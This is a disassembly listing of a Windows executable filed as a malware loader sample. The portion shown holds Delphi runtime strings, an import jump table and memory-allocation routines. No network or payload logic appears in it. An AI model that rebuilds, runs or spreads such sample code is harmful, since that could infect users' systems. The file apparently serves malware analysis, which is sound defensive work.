
malware_samples/loader/cf34174392d422249a3b1c2a488709b3606143bf51acfa14ca53928051697331.exe:     file format pei-i386


Disassembly of section CODE:

00401000 <CODE>:
  401000:	0a 06                	or     (%esi),%al
  401002:	73 74                	jae    0x401078
  401004:	72 69                	jb     0x40106f
  401006:	6e                   	outsb  %ds:(%esi),(%dx)
  401007:	67 00 00             	add    %al,(%bx,%si)
	...
  401016:	00 00                	add    %al,(%eax)
  401018:	3c 10                	cmp    $0x10,%al
  40101a:	40                   	inc    %eax
  40101b:	00 00                	add    %al,(%eax)
  40101d:	00 00                	add    %al,(%eax)
  40101f:	00 6d 11             	add    %ch,0x11(%ebp)
  401022:	40                   	inc    %eax
  401023:	00 04 00             	add    %al,(%eax,%eax,1)
  401026:	00 00                	add    %al,(%eax)
  401028:	00 00                	add    %al,(%eax)
  40102a:	00 00                	add    %al,(%eax)
  40102c:	c4 29                	les    (%ecx),%ebp
  40102e:	40                   	inc    %eax
  40102f:	00 ac 28 40 00 d4 28 	add    %ch,0x28d40040(%eax,%ebp,1)
  401036:	40                   	inc    %eax
  401037:	00 18                	add    %bl,(%eax)
  401039:	29 40 00             	sub    %eax,0x0(%eax)
  40103c:	11 00                	adc    %eax,(%eax)
  40103e:	0b 00                	or     (%eax),%eax
  401040:	24 29                	and    $0x29,%al
  401042:	40                   	inc    %eax
  401043:	00 04 46             	add    %al,(%esi,%eax,2)
  401046:	72 65                	jb     0x4010ad
  401048:	65 13 00             	adc    %gs:(%eax),%eax
  40104b:	30 29                	xor    %ch,(%ecx)
  40104d:	40                   	inc    %eax
  40104e:	00 0c 49             	add    %cl,(%ecx,%ecx,2)
  401051:	6e                   	outsb  %ds:(%esi),(%dx)
  401052:	69 74 49 6e 73 74 61 	imul   $0x6e617473,0x6e(%ecx,%ecx,2),%esi
  401059:	6e 
  40105a:	63 65 16             	arpl   %esp,0x16(%ebp)
  40105d:	00 4c 29 40          	add    %cl,0x40(%ecx,%ebp,1)
  401061:	00 0f                	add    %cl,(%edi)
  401063:	43                   	inc    %ebx
  401064:	6c                   	insb   (%dx),%es:(%edi)
  401065:	65 61                	gs popa
  401067:	6e                   	outsb  %ds:(%esi),(%dx)
  401068:	75 70                	jne    0x4010da
  40106a:	49                   	dec    %ecx
  40106b:	6e                   	outsb  %ds:(%esi),(%dx)
  40106c:	73 74                	jae    0x4010e2
  40106e:	61                   	popa
  40106f:	6e                   	outsb  %ds:(%esi),(%dx)
  401070:	63 65 10             	arpl   %esp,0x10(%ebp)
  401073:	00 68 28             	add    %ch,0x28(%eax)
  401076:	40                   	inc    %eax
  401077:	00 09                	add    %cl,(%ecx)
  401079:	43                   	inc    %ebx
  40107a:	6c                   	insb   (%dx),%es:(%edi)
  40107b:	61                   	popa
  40107c:	73 73                	jae    0x4010f1
  40107e:	54                   	push   %esp
  40107f:	79 70                	jns    0x4010f1
  401081:	65 10 00             	adc    %al,%gs:(%eax)
  401084:	6c                   	insb   (%dx),%es:(%edi)
  401085:	28 40 00             	sub    %al,0x0(%eax)
  401088:	09 43 6c             	or     %eax,0x6c(%ebx)
  40108b:	61                   	popa
  40108c:	73 73                	jae    0x401101
  40108e:	4e                   	dec    %esi
  40108f:	61                   	popa
  401090:	6d                   	insl   (%dx),%es:(%edi)
  401091:	65 12 00             	adc    %gs:(%eax),%al
  401094:	80 28 40             	subb   $0x40,(%eax)
  401097:	00 0b                	add    %cl,(%ebx)
  401099:	43                   	inc    %ebx
  40109a:	6c                   	insb   (%dx),%es:(%edi)
  40109b:	61                   	popa
  40109c:	73 73                	jae    0x401111
  40109e:	4e                   	dec    %esi
  40109f:	61                   	popa
  4010a0:	6d                   	insl   (%dx),%es:(%edi)
  4010a1:	65 49                	gs dec %ecx
  4010a3:	73 12                	jae    0x4010b7
  4010a5:	00 a8 28 40 00 0b    	add    %ch,0xb004028(%eax)
  4010ab:	43                   	inc    %ebx
  4010ac:	6c                   	insb   (%dx),%es:(%edi)
  4010ad:	61                   	popa
  4010ae:	73 73                	jae    0x401123
  4010b0:	50                   	push   %eax
  4010b1:	61                   	popa
  4010b2:	72 65                	jb     0x401119
  4010b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4010b5:	74 10                	je     0x4010c7
  4010b7:	00 c0                	add    %al,%al
  4010b9:	29 40 00             	sub    %eax,0x0(%eax)
  4010bc:	09 43 6c             	or     %eax,0x6c(%ebx)
  4010bf:	61                   	popa
  4010c0:	73 73                	jae    0x401135
  4010c2:	49                   	dec    %ecx
  4010c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4010c4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4010c6:	13 00                	adc    (%eax),%eax
  4010c8:	f8                   	clc
  4010c9:	28 40 00             	sub    %al,0x0(%eax)
  4010cc:	0c 49                	or     $0x49,%al
  4010ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4010cf:	73 74                	jae    0x401145
  4010d1:	61                   	popa
  4010d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4010d3:	63 65 53             	arpl   %esp,0x53(%ebp)
  4010d6:	69 7a 65 13 00 b0 29 	imul   $0x29b00013,0x65(%edx),%edi
  4010dd:	40                   	inc    %eax
  4010de:	00 0c 49             	add    %cl,(%ecx,%ecx,2)
  4010e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4010e2:	68 65 72 69 74       	push   $0x74697265
  4010e7:	73 46                	jae    0x40112f
  4010e9:	72 6f                	jb     0x40115a
  4010eb:	6d                   	insl   (%dx),%es:(%edi)
  4010ec:	0f 00 c8             	str    %eax
  4010ef:	29 40 00             	sub    %eax,0x0(%eax)
  4010f2:	08 44 69 73          	or     %al,0x73(%ecx,%ebp,2)
  4010f6:	70 61                	jo     0x401159
  4010f8:	74 63                	je     0x40115d
  4010fa:	68 14 00 f0 29       	push   $0x29f00014
  4010ff:	40                   	inc    %eax
  401100:	00 0d 4d 65 74 68    	add    %cl,0x6874654d
  401106:	6f                   	outsl  %ds:(%esi),(%dx)
  401107:	64 41                	fs inc %ecx
  401109:	64 64 72 65          	fs fs jb 0x401172
  40110d:	73 73                	jae    0x401182
  40110f:	11 00                	adc    %eax,(%eax)
  401111:	3c 2a                	cmp    $0x2a,%al
  401113:	40                   	inc    %eax
  401114:	00 0a                	add    %cl,(%edx)
  401116:	4d                   	dec    %ebp
  401117:	65 74 68             	gs je  0x401182
  40111a:	6f                   	outsl  %ds:(%esi),(%dx)
  40111b:	64 4e                	fs dec %esi
  40111d:	61                   	popa
  40111e:	6d                   	insl   (%dx),%es:(%edi)
  40111f:	65 13 00             	adc    %gs:(%eax),%eax
  401122:	78 2a                	js     0x40114e
  401124:	40                   	inc    %eax
  401125:	00 0c 46             	add    %cl,(%esi,%eax,2)
  401128:	69 65 6c 64 41 64 64 	imul   $0x64644164,0x6c(%ebp),%esp
  40112f:	72 65                	jb     0x401196
  401131:	73 73                	jae    0x4011a6
  401133:	15 00 c4 29 40       	adc    $0x4029c400,%eax
  401138:	00 0e                	add    %cl,(%esi)
  40113a:	44                   	inc    %esp
  40113b:	65 66 61             	gs popaw
  40113e:	75 6c                	jne    0x4011ac
  401140:	74 48                	je     0x40118a
  401142:	61                   	popa
  401143:	6e                   	outsb  %ds:(%esi),(%dx)
  401144:	64 6c                	fs insb (%dx),%es:(%edi)
  401146:	65 72 12             	gs jb  0x40115b
  401149:	00 ac 28 40 00 0b 4e 	add    %ch,0x4e0b0040(%eax,%ebp,1)
  401150:	65 77 49             	gs ja  0x40119c
  401153:	6e                   	outsb  %ds:(%esi),(%dx)
  401154:	73 74                	jae    0x4011ca
  401156:	61                   	popa
  401157:	6e                   	outsb  %ds:(%esi),(%dx)
  401158:	63 65 13             	arpl   %esp,0x13(%ebp)
  40115b:	00 d4                	add    %dl,%ah
  40115d:	28 40 00             	sub    %al,0x0(%eax)
  401160:	0c 46                	or     $0x46,%al
  401162:	72 65                	jb     0x4011c9
  401164:	65 49                	gs dec %ecx
  401166:	6e                   	outsb  %ds:(%esi),(%dx)
  401167:	73 74                	jae    0x4011dd
  401169:	61                   	popa
  40116a:	6e                   	outsb  %ds:(%esi),(%dx)
  40116b:	63 65 07             	arpl   %esp,0x7(%ebp)
  40116e:	54                   	push   %esp
  40116f:	4f                   	dec    %edi
  401170:	62 6a 65             	bound  %ebp,0x65(%edx)
  401173:	63 74 8d 40          	arpl   %esi,0x40(%ebp,%ecx,4)
  401177:	00 c3                	add    %al,%bl
  401179:	8d 40 00             	lea    0x0(%eax),%eax
  40117c:	ff 25 20 c1 40 00    	jmp    *0x40c120
  401182:	8b c0                	mov    %eax,%eax
  401184:	ff 25 1c c1 40 00    	jmp    *0x40c11c
  40118a:	8b c0                	mov    %eax,%eax
  40118c:	ff 25 18 c1 40 00    	jmp    *0x40c118
  401192:	8b c0                	mov    %eax,%eax
  401194:	ff 25 14 c1 40 00    	jmp    *0x40c114
  40119a:	8b c0                	mov    %eax,%eax
  40119c:	ff 25 10 c1 40 00    	jmp    *0x40c110
  4011a2:	8b c0                	mov    %eax,%eax
  4011a4:	ff 25 0c c1 40 00    	jmp    *0x40c10c
  4011aa:	8b c0                	mov    %eax,%eax
  4011ac:	ff 25 08 c1 40 00    	jmp    *0x40c108
  4011b2:	8b c0                	mov    %eax,%eax
  4011b4:	ff 25 28 c1 40 00    	jmp    *0x40c128
  4011ba:	8b c0                	mov    %eax,%eax
  4011bc:	ff 25 04 c1 40 00    	jmp    *0x40c104
  4011c2:	8b c0                	mov    %eax,%eax
  4011c4:	ff 25 00 c1 40 00    	jmp    *0x40c100
  4011ca:	8b c0                	mov    %eax,%eax
  4011cc:	ff 25 fc c0 40 00    	jmp    *0x40c0fc
  4011d2:	8b c0                	mov    %eax,%eax
  4011d4:	ff 25 f8 c0 40 00    	jmp    *0x40c0f8
  4011da:	8b c0                	mov    %eax,%eax
  4011dc:	ff 25 f4 c0 40 00    	jmp    *0x40c0f4
  4011e2:	8b c0                	mov    %eax,%eax
  4011e4:	ff 25 f0 c0 40 00    	jmp    *0x40c0f0
  4011ea:	8b c0                	mov    %eax,%eax
  4011ec:	ff 25 ec c0 40 00    	jmp    *0x40c0ec
  4011f2:	8b c0                	mov    %eax,%eax
  4011f4:	ff 25 e8 c0 40 00    	jmp    *0x40c0e8
  4011fa:	8b c0                	mov    %eax,%eax
  4011fc:	ff 25 e4 c0 40 00    	jmp    *0x40c0e4
  401202:	8b c0                	mov    %eax,%eax
  401204:	ff 25 e0 c0 40 00    	jmp    *0x40c0e0
  40120a:	8b c0                	mov    %eax,%eax
  40120c:	ff 25 dc c0 40 00    	jmp    *0x40c0dc
  401212:	8b c0                	mov    %eax,%eax
  401214:	ff 25 d8 c0 40 00    	jmp    *0x40c0d8
  40121a:	8b c0                	mov    %eax,%eax
  40121c:	ff 25 d4 c0 40 00    	jmp    *0x40c0d4
  401222:	8b c0                	mov    %eax,%eax
  401224:	ff 25 40 c1 40 00    	jmp    *0x40c140
  40122a:	8b c0                	mov    %eax,%eax
  40122c:	ff 25 3c c1 40 00    	jmp    *0x40c13c
  401232:	8b c0                	mov    %eax,%eax
  401234:	ff 25 38 c1 40 00    	jmp    *0x40c138
  40123a:	8b c0                	mov    %eax,%eax
  40123c:	ff 25 34 c1 40 00    	jmp    *0x40c134
  401242:	8b c0                	mov    %eax,%eax
  401244:	ff 25 30 c1 40 00    	jmp    *0x40c130
  40124a:	8b c0                	mov    %eax,%eax
  40124c:	ff 25 d0 c0 40 00    	jmp    *0x40c0d0
  401252:	8b c0                	mov    %eax,%eax
  401254:	ff 25 cc c0 40 00    	jmp    *0x40c0cc
  40125a:	8b c0                	mov    %eax,%eax
  40125c:	ff 25 c8 c0 40 00    	jmp    *0x40c0c8
  401262:	8b c0                	mov    %eax,%eax
  401264:	ff 25 c4 c0 40 00    	jmp    *0x40c0c4
  40126a:	8b c0                	mov    %eax,%eax
  40126c:	ff 25 c0 c0 40 00    	jmp    *0x40c0c0
  401272:	8b c0                	mov    %eax,%eax
  401274:	ff 25 bc c0 40 00    	jmp    *0x40c0bc
  40127a:	8b c0                	mov    %eax,%eax
  40127c:	ff 25 b8 c0 40 00    	jmp    *0x40c0b8
  401282:	8b c0                	mov    %eax,%eax
  401284:	ff 25 b4 c0 40 00    	jmp    *0x40c0b4
  40128a:	8b c0                	mov    %eax,%eax
  40128c:	53                   	push   %ebx
  40128d:	56                   	push   %esi
  40128e:	be 38 b4 40 00       	mov    $0x40b438,%esi
  401293:	83 3e 00             	cmpl   $0x0,(%esi)
  401296:	75 3a                	jne    0x4012d2
  401298:	68 44 06 00 00       	push   $0x644
  40129d:	6a 00                	push   $0x0
  40129f:	e8 a8 ff ff ff       	call   0x40124c
  4012a4:	8b c8                	mov    %eax,%ecx
  4012a6:	85 c9                	test   %ecx,%ecx
  4012a8:	75 05                	jne    0x4012af
  4012aa:	33 c0                	xor    %eax,%eax
  4012ac:	5e                   	pop    %esi
  4012ad:	5b                   	pop    %ebx
  4012ae:	c3                   	ret
  4012af:	a1 34 b4 40 00       	mov    0x40b434,%eax
  4012b4:	89 01                	mov    %eax,(%ecx)
  4012b6:	89 0d 34 b4 40 00    	mov    %ecx,0x40b434
  4012bc:	33 d2                	xor    %edx,%edx
  4012be:	8b c2                	mov    %edx,%eax
  4012c0:	03 c0                	add    %eax,%eax
  4012c2:	8d 44 c1 04          	lea    0x4(%ecx,%eax,8),%eax
  4012c6:	8b 1e                	mov    (%esi),%ebx
  4012c8:	89 18                	mov    %ebx,(%eax)
  4012ca:	89 06                	mov    %eax,(%esi)
  4012cc:	42                   	inc    %edx
  4012cd:	83 fa 64             	cmp    $0x64,%edx
  4012d0:	75 ec                	jne    0x4012be
  4012d2:	8b 06                	mov    (%esi),%eax
  4012d4:	8b 10                	mov    (%eax),%edx
  4012d6:	89 16                	mov    %edx,(%esi)
  4012d8:	5e                   	pop    %esi
  4012d9:	5b                   	pop    %ebx
  4012da:	c3                   	ret
  4012db:	90                   	nop
  4012dc:	89 00                	mov    %eax,(%eax)
  4012de:	89 40 04             	mov    %eax,0x4(%eax)
  4012e1:	c3                   	ret
  4012e2:	8b c0                	mov    %eax,%eax
  4012e4:	53                   	push   %ebx
  4012e5:	56                   	push   %esi
  4012e6:	8b f2                	mov    %edx,%esi
  4012e8:	8b d8                	mov    %eax,%ebx
  4012ea:	e8 9d ff ff ff       	call   0x40128c
  4012ef:	85 c0                	test   %eax,%eax
  4012f1:	75 05                	jne    0x4012f8
  4012f3:	33 c0                	xor    %eax,%eax
  4012f5:	5e                   	pop    %esi
  4012f6:	5b                   	pop    %ebx
  4012f7:	c3                   	ret
  4012f8:	8b 16                	mov    (%esi),%edx
  4012fa:	89 50 08             	mov    %edx,0x8(%eax)
  4012fd:	8b 56 04             	mov    0x4(%esi),%edx
  401300:	89 50 0c             	mov    %edx,0xc(%eax)
  401303:	8b 13                	mov    (%ebx),%edx
  401305:	89 10                	mov    %edx,(%eax)
  401307:	89 58 04             	mov    %ebx,0x4(%eax)
  40130a:	89 42 04             	mov    %eax,0x4(%edx)
  40130d:	89 03                	mov    %eax,(%ebx)
  40130f:	b0 01                	mov    $0x1,%al
  401311:	5e                   	pop    %esi
  401312:	5b                   	pop    %ebx
  401313:	c3                   	ret
  401314:	8b 50 04             	mov    0x4(%eax),%edx
  401317:	8b 08                	mov    (%eax),%ecx
  401319:	89 0a                	mov    %ecx,(%edx)
  40131b:	89 51 04             	mov    %edx,0x4(%ecx)
  40131e:	8b 15 38 b4 40 00    	mov    0x40b438,%edx
  401324:	89 10                	mov    %edx,(%eax)
  401326:	a3 38 b4 40 00       	mov    %eax,0x40b438
  40132b:	c3                   	ret
  40132c:	53                   	push   %ebx
  40132d:	56                   	push   %esi
  40132e:	57                   	push   %edi
  40132f:	55                   	push   %ebp
  401330:	51                   	push   %ecx
  401331:	8b f1                	mov    %ecx,%esi
  401333:	89 14 24             	mov    %edx,(%esp)
  401336:	8b e8                	mov    %eax,%ebp
  401338:	8b 5d 00             	mov    0x0(%ebp),%ebx
  40133b:	8b 04 24             	mov    (%esp),%eax
  40133e:	8b 10                	mov    (%eax),%edx
  401340:	89 16                	mov    %edx,(%esi)
  401342:	8b 50 04             	mov    0x4(%eax),%edx
  401345:	89 56 04             	mov    %edx,0x4(%esi)
  401348:	8b 3b                	mov    (%ebx),%edi
  40134a:	8b 43 08             	mov    0x8(%ebx),%eax
  40134d:	8b d0                	mov    %eax,%edx
  40134f:	03 53 0c             	add    0xc(%ebx),%edx
  401352:	3b 16                	cmp    (%esi),%edx
  401354:	75 14                	jne    0x40136a
  401356:	8b c3                	mov    %ebx,%eax
  401358:	e8 b7 ff ff ff       	call   0x401314
  40135d:	8b 43 08             	mov    0x8(%ebx),%eax
  401360:	89 06                	mov    %eax,(%esi)
  401362:	8b 43 0c             	mov    0xc(%ebx),%eax
  401365:	01 46 04             	add    %eax,0x4(%esi)
  401368:	eb 16                	jmp    0x401380
  40136a:	8b 16                	mov    (%esi),%edx
  40136c:	03 56 04             	add    0x4(%esi),%edx
  40136f:	3b c2                	cmp    %edx,%eax
  401371:	75 0d                	jne    0x401380
  401373:	8b c3                	mov    %ebx,%eax
  401375:	e8 9a ff ff ff       	call   0x401314
  40137a:	8b 43 0c             	mov    0xc(%ebx),%eax
  40137d:	01 46 04             	add    %eax,0x4(%esi)
  401380:	8b df                	mov    %edi,%ebx
  401382:	3b eb                	cmp    %ebx,%ebp
  401384:	75 c2                	jne    0x401348
  401386:	8b d6                	mov    %esi,%edx
  401388:	8b c5                	mov    %ebp,%eax
  40138a:	e8 55 ff ff ff       	call   0x4012e4
  40138f:	84 c0                	test   %al,%al
  401391:	75 04                	jne    0x401397
  401393:	33 c0                	xor    %eax,%eax
  401395:	89 06                	mov    %eax,(%esi)
  401397:	5a                   	pop    %edx
  401398:	5d                   	pop    %ebp
  401399:	5f                   	pop    %edi
  40139a:	5e                   	pop    %esi
  40139b:	5b                   	pop    %ebx
  40139c:	c3                   	ret
  40139d:	8d 40 00             	lea    0x0(%eax),%eax
  4013a0:	53                   	push   %ebx
  4013a1:	56                   	push   %esi
  4013a2:	57                   	push   %edi
  4013a3:	55                   	push   %ebp
  4013a4:	83 c4 f8             	add    $0xfffffff8,%esp
  4013a7:	8b d8                	mov    %eax,%ebx
  4013a9:	8b fb                	mov    %ebx,%edi
  4013ab:	8b 32                	mov    (%edx),%esi
  4013ad:	8b 43 08             	mov    0x8(%ebx),%eax
  4013b0:	3b f0                	cmp    %eax,%esi
  4013b2:	72 6c                	jb     0x401420
  4013b4:	8b ce                	mov    %esi,%ecx
  4013b6:	03 4a 04             	add    0x4(%edx),%ecx
  4013b9:	8b e8                	mov    %eax,%ebp
  4013bb:	03 6b 0c             	add    0xc(%ebx),%ebp
  4013be:	3b cd                	cmp    %ebp,%ecx
  4013c0:	77 5e                	ja     0x401420
  4013c2:	3b f0                	cmp    %eax,%esi
  4013c4:	75 1b                	jne    0x4013e1
  4013c6:	8b 42 04             	mov    0x4(%edx),%eax
  4013c9:	01 43 08             	add    %eax,0x8(%ebx)
  4013cc:	8b 42 04             	mov    0x4(%edx),%eax
  4013cf:	29 43 0c             	sub    %eax,0xc(%ebx)
  4013d2:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  4013d6:	75 44                	jne    0x40141c
  4013d8:	8b c3                	mov    %ebx,%eax
  4013da:	e8 35 ff ff ff       	call   0x401314
  4013df:	eb 3b                	jmp    0x40141c
  4013e1:	8b 0a                	mov    (%edx),%ecx
  4013e3:	8b 72 04             	mov    0x4(%edx),%esi
  4013e6:	03 ce                	add    %esi,%ecx
  4013e8:	8b f8                	mov    %eax,%edi
  4013ea:	03 7b 0c             	add    0xc(%ebx),%edi
  4013ed:	3b cf                	cmp    %edi,%ecx
  4013ef:	75 05                	jne    0x4013f6
  4013f1:	29 73 0c             	sub    %esi,0xc(%ebx)
  4013f4:	eb 26                	jmp    0x40141c
  4013f6:	8b 0a                	mov    (%edx),%ecx
  4013f8:	03 4a 04             	add    0x4(%edx),%ecx
  4013fb:	89 0c 24             	mov    %ecx,(%esp)
  4013fe:	2b f9                	sub    %ecx,%edi
  401400:	89 7c 24 04          	mov    %edi,0x4(%esp)
  401404:	8b 12                	mov    (%edx),%edx
  401406:	2b d0                	sub    %eax,%edx
  401408:	89 53 0c             	mov    %edx,0xc(%ebx)
  40140b:	8b d4                	mov    %esp,%edx
  40140d:	8b c3                	mov    %ebx,%eax
  40140f:	e8 d0 fe ff ff       	call   0x4012e4
  401414:	84 c0                	test   %al,%al
  401416:	75 04                	jne    0x40141c
  401418:	33 c0                	xor    %eax,%eax
  40141a:	eb 0c                	jmp    0x401428
  40141c:	b0 01                	mov    $0x1,%al
  40141e:	eb 08                	jmp    0x401428
  401420:	8b 1b                	mov    (%ebx),%ebx
  401422:	3b fb                	cmp    %ebx,%edi
  401424:	75 85                	jne    0x4013ab
  401426:	33 c0                	xor    %eax,%eax
  401428:	59                   	pop    %ecx
  401429:	5a                   	pop    %edx
  40142a:	5d                   	pop    %ebp
  40142b:	5f                   	pop    %edi
  40142c:	5e                   	pop    %esi
  40142d:	5b                   	pop    %ebx
  40142e:	c3                   	ret
  40142f:	90                   	nop
  401430:	53                   	push   %ebx
  401431:	56                   	push   %esi
  401432:	57                   	push   %edi
  401433:	8b da                	mov    %edx,%ebx
  401435:	8b f0                	mov    %eax,%esi
  401437:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  40143d:	7d 07                	jge    0x401446
  40143f:	be 00 00 10 00       	mov    $0x100000,%esi
  401444:	eb 0c                	jmp    0x401452
  401446:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  40144c:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  401452:	89 73 04             	mov    %esi,0x4(%ebx)
  401455:	6a 01                	push   $0x1
  401457:	68 00 20 00 00       	push   $0x2000
  40145c:	56                   	push   %esi
  40145d:	6a 00                	push   $0x0
  40145f:	e8 f8 fd ff ff       	call   0x40125c
  401464:	8b f8                	mov    %eax,%edi
  401466:	89 3b                	mov    %edi,(%ebx)
  401468:	85 ff                	test   %edi,%edi
  40146a:	74 23                	je     0x40148f
  40146c:	8b d3                	mov    %ebx,%edx
  40146e:	b8 3c b4 40 00       	mov    $0x40b43c,%eax
  401473:	e8 6c fe ff ff       	call   0x4012e4
  401478:	84 c0                	test   %al,%al
  40147a:	75 13                	jne    0x40148f
  40147c:	68 00 80 00 00       	push   $0x8000
  401481:	6a 00                	push   $0x0
  401483:	8b 03                	mov    (%ebx),%eax
  401485:	50                   	push   %eax
  401486:	e8 d9 fd ff ff       	call   0x401264
  40148b:	33 c0                	xor    %eax,%eax
  40148d:	89 03                	mov    %eax,(%ebx)
  40148f:	5f                   	pop    %edi
  401490:	5e                   	pop    %esi
  401491:	5b                   	pop    %ebx
  401492:	c3                   	ret
  401493:	90                   	nop
  401494:	53                   	push   %ebx
  401495:	56                   	push   %esi
  401496:	57                   	push   %edi
  401497:	55                   	push   %ebp
  401498:	8b d9                	mov    %ecx,%ebx
  40149a:	8b f2                	mov    %edx,%esi
  40149c:	8b e8                	mov    %eax,%ebp
  40149e:	c7 43 04 00 00 10 00 	movl   $0x100000,0x4(%ebx)
  4014a5:	6a 04                	push   $0x4
  4014a7:	68 00 20 00 00       	push   $0x2000
  4014ac:	68 00 00 10 00       	push   $0x100000
  4014b1:	55                   	push   %ebp
  4014b2:	e8 a5 fd ff ff       	call   0x40125c
  4014b7:	8b f8                	mov    %eax,%edi
  4014b9:	89 3b                	mov    %edi,(%ebx)
  4014bb:	85 ff                	test   %edi,%edi
  4014bd:	75 1f                	jne    0x4014de
  4014bf:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  4014c5:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  4014cb:	89 73 04             	mov    %esi,0x4(%ebx)
  4014ce:	6a 04                	push   $0x4
  4014d0:	68 00 20 00 00       	push   $0x2000
  4014d5:	56                   	push   %esi
  4014d6:	55                   	push   %ebp
  4014d7:	e8 80 fd ff ff       	call   0x40125c
  4014dc:	89 03                	mov    %eax,(%ebx)
  4014de:	83 3b 00             	cmpl   $0x0,(%ebx)
  4014e1:	74 23                	je     0x401506
  4014e3:	8b d3                	mov    %ebx,%edx
  4014e5:	b8 3c b4 40 00       	mov    $0x40b43c,%eax
  4014ea:	e8 f5 fd ff ff       	call   0x4012e4
  4014ef:	84 c0                	test   %al,%al
  4014f1:	75 13                	jne    0x401506
  4014f3:	68 00 80 00 00       	push   $0x8000
  4014f8:	6a 00                	push   $0x0
  4014fa:	8b 03                	mov    (%ebx),%eax
  4014fc:	50                   	push   %eax
  4014fd:	e8 62 fd ff ff       	call   0x401264
  401502:	33 c0                	xor    %eax,%eax
  401504:	89 03                	mov    %eax,(%ebx)
  401506:	5d                   	pop    %ebp
  401507:	5f                   	pop    %edi
  401508:	5e                   	pop    %esi
  401509:	5b                   	pop    %ebx
  40150a:	c3                   	ret
  40150b:	90                   	nop
  40150c:	53                   	push   %ebx
  40150d:	56                   	push   %esi
  40150e:	57                   	push   %edi
  40150f:	55                   	push   %ebp
  401510:	83 c4 ec             	add    $0xffffffec,%esp
  401513:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  401517:	89 14 24             	mov    %edx,(%esp)
  40151a:	c7 44 24 08 ff ff ff 	movl   $0xffffffff,0x8(%esp)
  401521:	ff 
  401522:	33 d2                	xor    %edx,%edx
  401524:	89 54 24 0c          	mov    %edx,0xc(%esp)
  401528:	8b e8                	mov    %eax,%ebp
  40152a:	8b 04 24             	mov    (%esp),%eax
  40152d:	03 c5                	add    %ebp,%eax
  40152f:	89 44 24 10          	mov    %eax,0x10(%esp)
  401533:	8b 1d 3c b4 40 00    	mov    0x40b43c,%ebx
  401539:	eb 51                	jmp    0x40158c
  40153b:	8b 3b                	mov    (%ebx),%edi
  40153d:	8b 73 08             	mov    0x8(%ebx),%esi
  401540:	3b ee                	cmp    %esi,%ebp
  401542:	77 46                	ja     0x40158a
  401544:	8b c6                	mov    %esi,%eax
  401546:	03 43 0c             	add    0xc(%ebx),%eax
  401549:	3b 44 24 10          	cmp    0x10(%esp),%eax
  40154d:	77 3b                	ja     0x40158a
  40154f:	3b 74 24 08          	cmp    0x8(%esp),%esi
  401553:	73 04                	jae    0x401559
  401555:	89 74 24 08          	mov    %esi,0x8(%esp)
  401559:	8b c6                	mov    %esi,%eax
  40155b:	03 43 0c             	add    0xc(%ebx),%eax
  40155e:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  401562:	76 04                	jbe    0x401568
  401564:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401568:	68 00 80 00 00       	push   $0x8000
  40156d:	6a 00                	push   $0x0
  40156f:	56                   	push   %esi
  401570:	e8 ef fc ff ff       	call   0x401264
  401575:	85 c0                	test   %eax,%eax
  401577:	75 0a                	jne    0x401583
  401579:	c7 05 18 b4 40 00 01 	movl   $0x1,0x40b418
  401580:	00 00 00 
  401583:	8b c3                	mov    %ebx,%eax
  401585:	e8 8a fd ff ff       	call   0x401314
  40158a:	8b df                	mov    %edi,%ebx
  40158c:	81 fb 3c b4 40 00    	cmp    $0x40b43c,%ebx
  401592:	75 a7                	jne    0x40153b
  401594:	8b 44 24 04          	mov    0x4(%esp),%eax
  401598:	33 d2                	xor    %edx,%edx
  40159a:	89 10                	mov    %edx,(%eax)
  40159c:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4015a1:	74 19                	je     0x4015bc
  4015a3:	8b 44 24 04          	mov    0x4(%esp),%eax
  4015a7:	8b 54 24 08          	mov    0x8(%esp),%edx
  4015ab:	89 10                	mov    %edx,(%eax)
  4015ad:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4015b1:	2b 44 24 08          	sub    0x8(%esp),%eax
  4015b5:	8b 54 24 04          	mov    0x4(%esp),%edx
  4015b9:	89 42 04             	mov    %eax,0x4(%edx)
  4015bc:	83 c4 14             	add    $0x14,%esp
  4015bf:	5d                   	pop    %ebp
  4015c0:	5f                   	pop    %edi
  4015c1:	5e                   	pop    %esi
  4015c2:	5b                   	pop    %ebx
  4015c3:	c3                   	ret
  4015c4:	53                   	push   %ebx
  4015c5:	56                   	push   %esi
  4015c6:	57                   	push   %edi
  4015c7:	55                   	push   %ebp
  4015c8:	83 c4 f4             	add    $0xfffffff4,%esp
  4015cb:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  4015cf:	89 14 24             	mov    %edx,(%esp)
  4015d2:	8b d0                	mov    %eax,%edx
  4015d4:	8b ea                	mov    %edx,%ebp
  4015d6:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  4015dc:	03 14 24             	add    (%esp),%edx
  4015df:	81 c2 ff 0f 00 00    	add    $0xfff,%edx
  4015e5:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
  4015eb:	89 54 24 08          	mov    %edx,0x8(%esp)
  4015ef:	8b 44 24 04          	mov    0x4(%esp),%eax
  4015f3:	89 28                	mov    %ebp,(%eax)
  4015f5:	8b 44 24 08          	mov    0x8(%esp),%eax
  4015f9:	2b c5                	sub    %ebp,%eax
  4015fb:	8b 54 24 04          	mov    0x4(%esp),%edx
  4015ff:	89 42 04             	mov    %eax,0x4(%edx)
  401602:	8b 35 3c b4 40 00    	mov    0x40b43c,%esi
  401608:	eb 3c                	jmp    0x401646
  40160a:	8b 5e 08             	mov    0x8(%esi),%ebx
  40160d:	8b 7e 0c             	mov    0xc(%esi),%edi
  401610:	03 fb                	add    %ebx,%edi
  401612:	3b eb                	cmp    %ebx,%ebp
  401614:	76 02                	jbe    0x401618
  401616:	8b dd                	mov    %ebp,%ebx
  401618:	3b 7c 24 08          	cmp    0x8(%esp),%edi
  40161c:	76 04                	jbe    0x401622
